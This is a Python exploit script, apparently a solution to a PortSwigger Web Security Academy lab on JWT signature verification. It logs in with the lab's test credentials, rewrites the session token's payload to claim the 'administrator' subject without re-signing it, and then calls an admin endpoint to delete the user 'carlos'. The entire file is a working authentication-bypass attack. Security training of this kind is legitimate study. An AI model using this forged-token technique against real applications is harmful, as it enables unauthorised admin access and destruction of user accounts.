import requests
import re
import sys
import jwt
import base64
import json
import time

def get_csrf_token(session, url):
    response = session.get(url)
    csrf_token = re.search(r'name="csrf" value="(.*?)"', response.text).group(1)
    return csrf_token

def login(session, url, csrf_token):
    data = {
        'csrf': csrf_token,
        'username': 'wiener',
        'password': 'peter'
    }
    session.post(url, data=data)

def modify_jwt_token(session):
    original_token = session.cookies['session']
    header, payload, signature = original_token.split('.')

    payload_decoded = json.loads(base64.urlsafe_b64decode(payload + '=='))

    payload_decoded['iss'] = 'portswigger'
    payload_decoded['exp'] = int(time.time()) + 3600
    payload_decoded['sub'] = 'administrator'

    new_payload = base64.urlsafe_b64encode(json.dumps(payload_decoded).encode()).decode().strip('=')

    new_token = f"{header}.{new_payload}.{signature}"

    session.cookies.set('session', new_token)

def delete_user(session, url):
    response = session.get(url)
    return response

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

    base_url = sys.argv[1]

    login_url = f"{base_url}/login"
    delete_url = f"{base_url}/admin/delete?username=carlos"

    with requests.Session() as session:
        csrf_token = get_csrf_token(session, login_url)
        login(session, login_url, csrf_token)
        modify_jwt_token(session)
        response = delete_user(session, delete_url)
